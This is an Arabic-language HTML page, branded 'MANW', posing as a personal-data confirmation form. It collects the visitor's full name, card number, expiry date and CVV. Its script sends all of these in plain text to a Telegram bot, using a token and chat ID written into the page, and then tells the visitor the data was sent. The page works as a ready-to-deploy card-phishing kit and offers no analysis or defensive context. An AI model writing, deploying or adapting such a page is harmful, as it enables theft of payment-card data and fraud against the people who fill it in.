<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MANW</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: Tahoma, Arial, sans-serif;
      background: #f1eeee;
      color: #252525;
    }
    header {
      background: #861f35;
      color: white;
      text-align: center;
      padding: 30px 15px;
      border-bottom: 5px solid #d9ae38;
    }
    header h1 {
      margin: 0;
      font-size: 32px;
    }
    .container {
      width: 92%;
      max-width: 950px;
      margin: 30px auto;
    }
    .card {
      background: white;
      padding: 25px;
      border-radius: 16px;
      box-shadow: 0 5px 20px #00000012;
      margin-bottom: 22px;
    }
    h2 {
      color: #861f35;
      margin-top: 0;
    }
    label {
      display: block;
      margin: 15px 0 7px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 14px;
      border: 1px solid #ccc;
      border-radius: 9px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 15px;
      margin-top: 22px;
      background: #861f35;
      color: white;
      border: none;
      border-radius: 9px;
      font-size: 17px;
      cursor: pointer;
    }
    button:hover {
      background: #681728;
    }
    #result {
      display: none;
      padding: 15px;
      background: #f5f0f0;
      margin-top: 18px;
      border-radius: 9px;
      text-align: center;
      font-weight: bold;
    }
    footer {
      text-align: center;
      padding: 20px;
      color: #666;
      font-size: 13px;
    }
    @media (min-width: 700px) {
      .container { margin-top: 45px; }
      .card { padding: 35px; }
    }
  </style>
</head>
<body>
  <header>
    <h1>MANW</h1>
  </header>
  <div class="container">
    <section class="card">
      <h2>البيانات الشخصية</h2>
      <form id="demoForm">
        <label for="name">الاسم</label>
        <input id="name" placeholder="الاسم كاملاً" autocomplete="off" required>

        <label for="number">رقم البطاقة</label>
        <input id="number" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" autocomplete="off" required>

        <label for="expiry">تاريخ الانتهاء</label>
        <input id="expiry" placeholder="MM/YY" maxlength="5" autocomplete="off" required>

        <label for="code">رمز التحقق</label>
        <input id="code" placeholder="000" maxlength="3" inputmode="numeric" autocomplete="off" required>

        <button type="submit" id="submitBtn">تأكيد البيانات</button>
      </form>
      <div id="result" aria-live="polite"></div>
    </section>
  </div>
  <footer>
    MANW
  </footer>

  <script>
    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
    const CHAT_ID = "7713496654";

    const number = document.getElementById("number");
    number.addEventListener("input", function () {
      let value = this.value.replace(/\D/g, "").slice(0, 16);
      this.value = value.replace(/(.{4})/g, "$1 ").trim();
    });

    document.getElementById("expiry").addEventListener("input", function () {
      let value = this.value.replace(/\D/g, "").slice(0, 4);
      this.value = value.length > 2 ? value.slice(0, 2) + "/" + value.slice(2) : value;
    });

    document.getElementById("demoForm").addEventListener("submit", async function (event) {
      event.preventDefault();
      
      const submitBtn = document.getElementById("submitBtn");
      const result = document.getElementById("result");
      
      const name = document.getElementById("name").value.trim();
      const cardNum = number.value.trim();
      const expiry = document.getElementById("expiry").value.trim();
      const code = document.getElementById("code").value.trim();

      submitBtn.disabled = true;
      submitBtn.textContent = "جاري الإرسال...";

      const message = `🚨 بيان جديد وارد:\n\n👤 الاسم: ${name}\n💳 رقم البطاقة: ${cardNum}\n📅 تاريخ الانتهاء: ${expiry}\n🔑 رمز التحقق: ${code}`;

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

        if (response.ok) {
          result.style.display = "block";
          result.style.color = "#2ea44f";
          result.textContent = "تم إرسال البيانات بنجاح.";
        } else {
          throw new Error("فشل الإرسال");
        }
      } catch (err) {
        result.style.display = "block";
        result.style.color = "#ff2638";
        result.textContent = "حدث خطأ أثناء الإرسال، حاول مرة أخرى.";
        submitBtn.disabled = false;
        submitBtn.textContent = "تأكيد البيانات";
      }
    });
  </script>
</body>
</html>
